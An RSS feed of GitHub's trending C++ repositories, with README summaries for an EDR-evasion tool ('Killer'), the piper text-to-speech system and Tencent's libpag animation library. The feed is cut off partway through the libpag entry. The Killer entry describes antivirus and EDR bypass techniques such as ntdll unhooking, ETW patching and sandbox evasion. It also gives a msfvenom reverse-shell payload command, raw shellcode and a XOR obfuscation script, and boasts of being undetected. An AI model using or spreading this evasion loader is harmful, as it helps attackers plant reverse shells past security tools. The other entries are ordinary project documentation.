<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub C++ Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2023-04-13T01:30:43Z</updated>
  <subtitle>Daily Trending of C++ in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>0xHossam/Killer</title>
    <updated>2023-04-13T01:30:43Z</updated>
    <id>tag:github.com,2023-04-13:/0xHossam/Killer</id>
    <link href="https://github.com/0xHossam/Killer" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Is a tool created to evade AVs and EDRs or security tools.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;KILLER TOOL (EDR Evasion)&lt;/h1&gt; &#xA;&lt;p&gt;It&#39;s a AV/EDR Evasion tool created to bypass security tools for learning, until now the tool is FUD.&lt;/p&gt; &#xA;&lt;h1&gt;Features:&lt;/h1&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Module Stomping for Memory scanning evasion&lt;/li&gt; &#xA; &lt;li&gt;DLL Unhooking by fresh ntdll copy&lt;/li&gt; &#xA; &lt;li&gt;IAT Hiding and Obfuscation &amp;amp; API Unhooking&lt;/li&gt; &#xA; &lt;li&gt;ETW Patchnig for bypassing some security controls&lt;/li&gt; &#xA; &lt;li&gt;Included sandbox evasion techniques &amp;amp; Basic Anti-Debugging&lt;/li&gt; &#xA; &lt;li&gt;Fully obfuscated (Functions - Keys - Shellcode) by XOR-ing&lt;/li&gt; &#xA; &lt;li&gt;Shellcode reversed and Encrypted&lt;/li&gt; &#xA; &lt;li&gt;Moving payload into hallowed memory without using APIs&lt;/li&gt; &#xA; &lt;li&gt;Runs without creating new thread &amp;amp; Suppoers x64 and x86 arch&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h1&gt;How to use it&lt;/h1&gt; &#xA;&lt;p&gt;Generate your shellcode with msfvenom tool :&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST&amp;lt;IP&amp;gt; LPORT&amp;lt;PORT&amp;gt; -f py&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Then copy the output into the encryptor XOR function :&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;    data = b&#34;\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&#34;&#xA;&#xA;    key  = 0x50 # Put here your key as byte like for example (0x90 or 0x40 or 0x30) and more...&#xA;&#xA;    print(&#39;{ &#39;, end=&#39;&#39;)&#xA;    for i in data:&#xA;        print(hex(i ^ key), end=&#39;, &#39;)&#xA;&#xA;    print(&#34;0x0 };&#34;) # Notice that it adds one byte &#34;0x0&#34; to the end.&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;And then you can handle your decryption function, It&#39;s not easy for script kiddies ^-^, you can read more about it in my articale :&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Part 1 =&amp;gt; &lt;a href=&#34;https://medium.com/@0xHossam/av-edr-evasion-malware-development-933e50f47af5&#34;&gt;https://medium.com/@0xHossam/av-edr-evasion-malware-development-933e50f47af5&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Part 2 =&amp;gt; &lt;a href=&#34;https://medium.com/@0xHossam/av-edr-evasion-malware-development-p2-7a947f7db354&#34;&gt;https://medium.com/@0xHossam/av-edr-evasion-malware-development-p2-7a947f7db354&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;This is the result when running :&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/82971998/230731975-a70abd1c-279b-4e79-9e91-6b5212b7db9a.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;h1&gt;PoC (Proof-of-Concept) :&lt;/h1&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://antiscan.me/images/result/07OkIKKhpRsG.png&#34;&gt;https://antiscan.me/images/result/07OkIKKhpRsG.png&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/82971998/230732045-ca2638fe-4f3c-4926-8f94-4fff817ca585.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;h1&gt;Important Notes&lt;/h1&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;First thanks to Abdallah Mohammed for helping me to develop it ^_^&lt;/li&gt; &#xA; &lt;li&gt;The tool is for educational purposes only&lt;/li&gt; &#xA; &lt;li&gt;Compile the code with visual studio compiler&lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
  <entry>
    <title>rhasspy/piper</title>
    <updated>2023-04-13T01:30:43Z</updated>
    <id>tag:github.com,2023-04-13:/rhasspy/piper</id>
    <link href="https://github.com/rhasspy/piper" rel="alternate"></link>
    <summary type="html">&lt;p&gt;A fast, local neural text to speech system&lt;/p&gt;&lt;hr&gt;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/rhasspy/piper/master/etc/logo.png&#34; alt=&#34;Piper logo&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;A fast, local neural text to speech system that sounds great and is optimized for the Raspberry Pi 4.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;echo &#39;Welcome to the world of speech synthesis!&#39; | \&#xA;  ./piper --model en-us-blizzard_lessac-medium.onnx --output_file welcome.wav&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Voices are trained with &lt;a href=&#34;https://github.com/jaywalnut310/vits/&#34;&gt;VITS&lt;/a&gt; and exported to the &lt;a href=&#34;https://onnxruntime.ai/&#34;&gt;onnxruntime&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Voices&lt;/h2&gt; &#xA;&lt;p&gt;Our goal is to support Home Assistant and the &lt;a href=&#34;https://www.home-assistant.io/blog/2022/12/20/year-of-voice/&#34;&gt;Year of Voice&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Download voices from &lt;a href=&#34;https://github.com/rhasspy/piper/releases/tag/v0.0.2&#34;&gt;the release&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Supported languages:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Catalan (ca)&lt;/li&gt; &#xA; &lt;li&gt;Danish (da)&lt;/li&gt; &#xA; &lt;li&gt;Dutch (nl)&lt;/li&gt; &#xA; &lt;li&gt;French (fr)&lt;/li&gt; &#xA; &lt;li&gt;German (de)&lt;/li&gt; &#xA; &lt;li&gt;Italian (it)&lt;/li&gt; &#xA; &lt;li&gt;Kazakh (kk)&lt;/li&gt; &#xA; &lt;li&gt;Nepali (ne)&lt;/li&gt; &#xA; &lt;li&gt;Norwegian (no)&lt;/li&gt; &#xA; &lt;li&gt;Spanish (es)&lt;/li&gt; &#xA; &lt;li&gt;Ukrainian (uk)&lt;/li&gt; &#xA; &lt;li&gt;U.S. English (en-us)&lt;/li&gt; &#xA; &lt;li&gt;Vietnamese (vi)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Installation&lt;/h2&gt; &#xA;&lt;p&gt;Download a release:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/rhasspy/piper/releases/download/v0.0.2/piper_amd64.tar.gz&#34;&gt;amd64&lt;/a&gt; (desktop Linux)&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/rhasspy/piper/releases/download/v0.0.2/piper_arm64.tar.gz&#34;&gt;arm64&lt;/a&gt; (Raspberry Pi 4)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;If you want to build from source, see the &lt;a href=&#34;https://raw.githubusercontent.com/rhasspy/piper/master/Makefile&#34;&gt;Makefile&lt;/a&gt; and &lt;a href=&#34;https://raw.githubusercontent.com/rhasspy/piper/master/src/cpp&#34;&gt;C++ source&lt;/a&gt;. Last tested with &lt;a href=&#34;https://github.com/microsoft/onnxruntime&#34;&gt;onnxruntime&lt;/a&gt; 1.13.1.&lt;/p&gt; &#xA;&lt;h2&gt;Usage&lt;/h2&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/rhasspy/piper/master/#voices&#34;&gt;Download a voice&lt;/a&gt; and extract the &lt;code&gt;.onnx&lt;/code&gt; and &lt;code&gt;.onnx.json&lt;/code&gt; files&lt;/li&gt; &#xA; &lt;li&gt;Run the &lt;code&gt;piper&lt;/code&gt; binary with text on standard input, &lt;code&gt;--model /path/to/your-voice.onnx&lt;/code&gt;, and &lt;code&gt;--output_file output.wav&lt;/code&gt;&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;For example:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;echo &#39;Welcome to the world of speech synthesis!&#39; | \&#xA;  ./piper --model blizzard_lessac-medium.onnx --output_file welcome.wav&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;For multi-speaker models, use &lt;code&gt;--speaker &amp;lt;number&amp;gt;&lt;/code&gt; to change speakers (default: 0).&lt;/p&gt; &#xA;&lt;p&gt;See &lt;code&gt;piper --help&lt;/code&gt; for more options.&lt;/p&gt; &#xA;&lt;h2&gt;Training&lt;/h2&gt; &#xA;&lt;p&gt;See &lt;a href=&#34;https://raw.githubusercontent.com/rhasspy/piper/master/src/python&#34;&gt;src/python&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Start by creating a virtual environment:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;cd piper/src/python&#xA;python3 -m venv .venv&#xA;source .venv/bin/activate&#xA;pip3 install --upgrade pip&#xA;pip3 install --upgrade wheel setuptools&#xA;pip3 install -r requirements.txt&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Run the &lt;code&gt;build_monotonic_align.sh&lt;/code&gt; script in the &lt;code&gt;src/python&lt;/code&gt; directory to build the extension.&lt;/p&gt; &#xA;&lt;p&gt;Ensure you have &lt;a href=&#34;https://github.com/espeak-ng/espeak-ng/&#34;&gt;espeak-ng&lt;/a&gt; installed (&lt;code&gt;sudo apt-get install espeak-ng&lt;/code&gt;).&lt;/p&gt; &#xA;&lt;p&gt;Next, preprocess your dataset:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;python3 -m piper_train.preprocess \&#xA;  --language en-us \&#xA;  --input-dir /path/to/ljspeech/ \&#xA;  --output-dir /path/to/training_dir/ \&#xA;  --dataset-format ljspeech \&#xA;  --sample-rate 22050&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Datasets must either be in the &lt;a href=&#34;https://keithito.com/LJ-Speech-Dataset/&#34;&gt;LJSpeech&lt;/a&gt; format or from &lt;a href=&#34;https://github.com/MycroftAI/mimic-recording-studio&#34;&gt;Mimic Recording Studio&lt;/a&gt; (&lt;code&gt;--dataset-format mycroft&lt;/code&gt;).&lt;/p&gt; &#xA;&lt;p&gt;Finally, you can train:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;python3 -m piper_train \&#xA;    --dataset-dir /path/to/training_dir/ \&#xA;    --accelerator &#39;gpu&#39; \&#xA;    --devices 1 \&#xA;    --batch-size 32 \&#xA;    --validation-split 0.05 \&#xA;    --num-test-examples 5 \&#xA;    --max_epochs 10000 \&#xA;    --precision 32&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Training uses &lt;a href=&#34;https://www.pytorchlightning.ai/&#34;&gt;PyTorch Lightning&lt;/a&gt;. Run &lt;code&gt;tensorboard --logdir /path/to/training_dir/lightning_logs&lt;/code&gt; to monitor. See &lt;code&gt;python3 -m piper_train --help&lt;/code&gt; for many additional options.&lt;/p&gt; &#xA;&lt;p&gt;It is highly recommended to train with the following &lt;code&gt;Dockerfile&lt;/code&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-dockerfile&#34;&gt;FROM nvcr.io/nvidia/pytorch:22.03-py3&#xA;&#xA;RUN pip3 install \&#xA;    &#39;pytorch-lightning&#39;&#xA;&#xA;ENV NUMBA_CACHE_DIR=.numba_cache&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;See the various &lt;code&gt;infer_*&lt;/code&gt; and &lt;code&gt;export_*&lt;/code&gt; scripts in &lt;a href=&#34;https://raw.githubusercontent.com/rhasspy/piper/master/src/python/piper_train&#34;&gt;src/python/piper_train&lt;/a&gt; to test and export your voice from the checkpoint in &lt;code&gt;lightning_logs&lt;/code&gt;. The &lt;code&gt;dataset.jsonl&lt;/code&gt; file in your training directory can be used with &lt;code&gt;python3 -m piper_train.infer&lt;/code&gt; for quick testing:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;head -n5 /path/to/training_dir/dataset.jsonl | \&#xA;  python3 -m piper_train.infer \&#xA;    --checkpoint lightning_logs/path/to/checkpoint.ckpt \&#xA;    --sample-rate 22050 \&#xA;    --output-dir wavs&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Running in Python&lt;/h2&gt; &#xA;&lt;p&gt;See &lt;a href=&#34;https://raw.githubusercontent.com/rhasspy/piper/master/src/python_run&#34;&gt;src/python_run&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Run &lt;code&gt;scripts/setup.sh&lt;/code&gt; to create a virtual environment and install the requirements. Then run:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;echo &#39;Welcome to the world of speech synthesis!&#39; | scripts/piper \&#xA;  --model /path/to/voice.onnx \&#xA;  --output_file welcome.wav&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;If you&#39;d like to use a GPU, install the &lt;code&gt;onnxruntime-gpu&lt;/code&gt; package:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;.venv/bin/pip3 install onnxruntime-gpu&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;and then run &lt;code&gt;scripts/piper&lt;/code&gt; with the &lt;code&gt;--cuda&lt;/code&gt; argument. You will need to have a functioning CUDA environment, such as what&#39;s available in &lt;a href=&#34;https://catalog.ngc.nvidia.com/orgs/nvidia/containers/pytorch&#34;&gt;NVIDIA&#39;s PyTorch containers&lt;/a&gt;.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>Tencent/libpag</title>
    <updated>2023-04-13T01:30:43Z</updated>
    <id>tag:github.com,2023-04-13:/Tencent/libpag</id>
    <link href="https://github.com/Tencent/libpag" rel="alternate"></link>
    <summary type="html">&lt;p&gt;The official rendering library for PAG (Portable Animated Graphics) files that renders After Effects animations natively across multiple platforms.&lt;/p&gt;&lt;hr&gt;&lt;img src=&#34;https://raw.githubusercontent.com/Tencent/libpag/main/resources/readme/logo.png&#34; alt=&#34;PAG Logo&#34; width=&#34;474&#34;&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/Tencent/libpag/raw/master/LICENSE.txt&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/license-Apache%202-blue&#34; alt=&#34;license&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/Tencent/libpag/pulls&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/PRs-welcome-brightgreen.svg?sanitize=true&#34; alt=&#34;PRs Welcome&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://codecov.io/gh/Tencent/libpag&#34;&gt;&lt;img src=&#34;https://codecov.io/gh/Tencent/libpag/branch/main/graph/badge.svg?sanitize=true&#34; alt=&#34;codecov&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/Tencent/libpag/actions&#34;&gt;&lt;img src=&#34;https://github.com/Tencent/libpag/workflows/autotest/badge.svg?branch=main&#34; alt=&#34;Actions Status&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/Tencent/libpag/releases&#34;&gt;&lt;img src=&#34;https://img.shields.io/github/v/release/Tencent/libpag&#34; alt=&#34;GitHub release (latest SemVer)&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;English | &lt;a href=&#34;https://github.com/Tencent/libpag/wiki&#34;&gt;简体中文&lt;/a&gt; | &lt;a href=&#34;https://pag.art&#34;&gt;Homepage&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Introduction&lt;/h2&gt; &#xA;&lt;p&gt;libpag is a real-time rendering library for PAG (Portable Animated Graphics) files that renders both vector-based and raster-based animations across most platforms, such as iOS, Android, macOS, Windows, Linux, and Web.&lt;/p&gt; &#xA;&lt;p&gt;PAG is an open-source file format for recording animations. PAG files can be created and exported from Adobe After Effects with the PAGExporter plugin and previewed in the PAGViewer app, which you can get from &lt;a href=&#34;https://pag.art&#34;&gt;pag.art&lt;/a&gt;, and both of them are available on both macOS and Windows.&lt;/p&gt; &#xA;&lt;p&gt;PAG is now being used by 40+ Tencent apps, such as WeChat, Mobile QQ, Honor of Kings Mobile Game, Tencent Video, QQ Music, and so on, reaching hundreds of millions of users.&lt;/p&gt; &#xA;&lt;h2&gt;Advantages&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;Highly efficient file format&lt;/strong&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;img src=&#34;https://raw.githubusercontent.com/Tencent/libpag/main/resources/readme/intro_1.png&#34; alt=&#34;intro_1&#34; width=&#34;282&#34;&gt; &#xA;&lt;p&gt;Benefiting from the highly efficient binary format design, PAG files can be decoded 10x faster than JSON files but also are about 50% smaller in file size when exporting the same animations. Designers can also ship beautiful animations with bitmaps or audiovisual media integrated into a single file easily without other attachments.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;All AE features supported&lt;/strong&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;img src=&#34;https://raw.githubusercontent.com/Tencent/libpag/main/resources/readme/intro_2.png&#34; alt=&#34;intro_2&#34; width=&#34;282&#34;&gt; &#xA;&lt;p&gt;While other solutions may only support exporting limited vector-based AE features, PAG supports exporting all AE animations into a single file by combining vector-based exporting with raster-based exporting techniques. Therefore, third-party plugin effects in AE can be exported as well.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;Measurable performance&lt;/strong&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;img src=&#34;https://raw.githubusercontent.com/Tencent/libpag/main/resources/readme/intro_4.png&#34; alt=&#34;intro_4&#34; width=&#34;282&#34;&gt; &#xA;&lt;p&gt;PAG provides a monitoring panel in PAGViewer that shows normalized performance data for PAG files, which helps designers to examine and optimize performance easily without developers. Along with dozens of automatic optimization techniques from the PAGExporter plugin, animations with cool visual effects and excellent performance now can be created more effectively.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;Runtime editable animations&lt;/strong&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;img src=&#34;https://raw.githubusercontent.com/Tencent/libpag/main/resources/readme/intro_5.png&#34; alt=&#34;intro_5&#34; width=&#34;282&#34;&gt; &#xA;&lt;p&gt;With the flexible editing APIs from PAG SDK, developers can easily change the layer structure of a single PAG file, mix multiple PAG files into one composition, or replace texts and images with all pre-designed animation effects applied at runtime. It reduces tons of coding work for product features like video templates.&lt;/p&gt; &#xA;&lt;h2&gt;System Requirements&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;iOS 9.0 or later&lt;/li&gt; &#xA; &lt;li&gt;Android 4.4 or later&lt;/li&gt; &#xA; &lt;li&gt;macOS 10.13 or later&lt;/li&gt; &#xA; &lt;li&gt;Windows 7.0 or later&lt;/li&gt; &#xA; &lt;li&gt;Chrome 69.0 or later (Web)&lt;/li&gt; &#xA; &lt;li&gt;Safari 11.3 or later (Web)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Getting Started&lt;/h2&gt; &#xA;&lt;p&gt;We currently only publish precompiled libraries for iOS, Android, and Web. You can build libraries of other platforms from the source code. The latest releases can be downloaded from &lt;a href=&#34;https://github.com/Tencent/libpag/releases&#34;&gt;here&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;iOS Integration&lt;/h3&gt; &#xA;&lt;p&gt;You can use the framework downloaded from the release page, or add libpag to your project by CocoaPods: Add the pod to your Podfile:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;pod &#39;libpag&#39;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;And then run:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;pod install&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;After installing the cocoapod into your project import libpag with&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;#import &amp;lt;libpag/xxx.h&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Android Integration&lt;/h3&gt; &#xA;&lt;p&gt;You can use the aar downloaded from the release page, or add libpag to your project by Maven:&lt;/p&gt; &#xA;&lt;p&gt;Edit the &lt;code&gt;build.gradle&lt;/code&gt; file in the root of your project, add &lt;code&gt;mavenCentral()&lt;/code&gt; to &lt;code&gt;repositories&lt;/code&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;buildscript {&#xA;    repositories {&#xA;        mavenCentral()&#xA;    }&#xA;    dependencies {&#xA;        classpath &#39;com.android.tools.build:gradle:3.2.1&#39;&#xA;    }&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Add libpag to &lt;code&gt;app/build.gradle&lt;/code&gt; (&lt;em&gt;&lt;code&gt;4.0.5.10&lt;/code&gt; should be replaced with the latest release version&lt;/em&gt;):&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;dependencies {&#xA;    implementation &#39;com.tencent.tav:libpag:4.0.5.10&#39;&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Add the following rule to your proguard rules to avoid the wrong obfuscation.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;  -keep class org.libpag.** {*;}&#xA;  -keep class androidx.exifinterface.** {*;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Finally, run gradle sync and then build the project.&lt;/p&gt; &#xA;&lt;h3&gt;Web Integration&lt;/h3&gt; &#xA;&lt;p&gt;Simply copy the following code into an HTML file and open it in your browser:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;canvas class=&#34;canvas&#34; id=&#34;pag&#34;&amp;gt;&amp;lt;/canvas&amp;gt;&#xA;&amp;lt;script src=&#34;https://unpkg.com/libpag@latest/lib/libpag.min.js&#34;&amp;gt;&amp;lt;/script&amp;gt;&#xA;&amp;lt;script&amp;gt;&#xA;  window.libpag.PAGInit().then((PAG) =&amp;gt; {&#xA;    const url = &#39;https://pag.art/file/like.pag&#39;;&#xA;    fetch(url)&#xA;      .then((response) =&amp;gt; response.blob())&#xA;      .then(async (blob) =&amp;gt; {&#xA;        const file = new window.File([blob], url.replace(/(.*\/)*([^.]+)/i, &#39;$2&#39;));&#xA;        // Do Something.&#xA;      });&#xA;  });&#xA;&amp;lt;/script&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;More information：&lt;a href=&#34;https://raw.githubusercontent.com/Tencent/libpag/main/web/README.md&#34;&gt;Web SDK Guide&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Example&lt;/h3&gt; &#xA;&lt;p&gt;Check out the following projects to learn how to use the APIs of libpag:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/libpag/pag-ios&#34;&gt;https://github.com/libpag/pag-ios&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/libpag/pag-android&#34;&gt;https://github.com/libpag/pag-android&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/libpag/pag-web&#34;&gt;https://github.com/libpag/pag-web&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Documentation&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://pag.art/api.html#/apis/ios/&#34;&gt;iOS API Reference&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://pag.art/api.html#/apis/android/org/libpag/package-summary.html&#34;&gt;Android API Reference&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://pag.art/api.html#/apis/web/&#34;&gt;Web API Reference&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;You can find other docs on &lt;a href=&#34;https://github.com/Tencent/libpag/wiki&#34;&gt;Wiki&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Development&lt;/h2&gt; &#xA;&lt;p&gt;We recommend using CLion IDE on the macOS platform for development.&lt;/p&gt; &#xA;&lt;h3&gt;Branch Management&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;The &lt;code&gt;main&lt;/code&gt; branch is our active developing branch which contains the latest features and bugfixes.&lt;/li&gt; &#xA; &lt;li&gt;The branches under &lt;code&gt;release/&lt;/code&gt; are our stable milestone branches which are fully tested. We will periodically cut a &lt;code&gt;release/{version}&lt;/code&gt; branch from the &lt;code&gt;main&lt;/code&gt; branch. After one &lt;code&gt;release/{version}&lt;/code&gt; branch is cut, only high priority fixes are checked into it.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;strong&gt;Note: This repository only contains the latest code since PAG 4.0. To use the legacy PAG 3.0 versions, you can download the precompiled libraries from &lt;a href=&#34;https://github.com/Tencent/libpag/releases&#34;&gt;here&lt;/a&gt;.&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Build Prerequisites&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Xcode 11.0+&lt;/li&gt; &#xA; &lt;li&gt;GCC 7.0+&lt;/li&gt; &#xA; &lt;li&gt;CMake 3.10.2+&lt;/li&gt; &#xA; &lt;li&gt;Visual Studio 2019&lt;/li&gt; &#xA; &lt;li&gt;NDK 19.2.5345600 （&lt;strong&gt;Please use this exact version of NDK, other versions may fail.&lt;/strong&gt;)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Dependency Management&lt;/h3&gt; &#xA;&lt;p&gt;libpag uses &lt;code&gt;depsync&lt;/code&gt; tool to manage third-party dependencies.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;For macOS platform：&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Just simply run the script in the root of libpag project:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;./sync_deps.sh&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;This script will automatically install necessary tools and synchronize all third-party repositories.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;For other platforms：&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;First, make sure you have installed the latest version of node.js (You may need to restart your computer after this step). And then run the following command to install depsync tool:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;npm install -g depsync&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;And then run &lt;code&gt;depsync&lt;/code&gt; in the root directory of libpag project.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;depsync&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Git account and password may be required during synchronizing. Please make sure you have enabled the &lt;code&gt;git-credential-store&lt;/code&gt; so that &lt;code&gt;CMakeList.txt&lt;/code&gt; can trigger 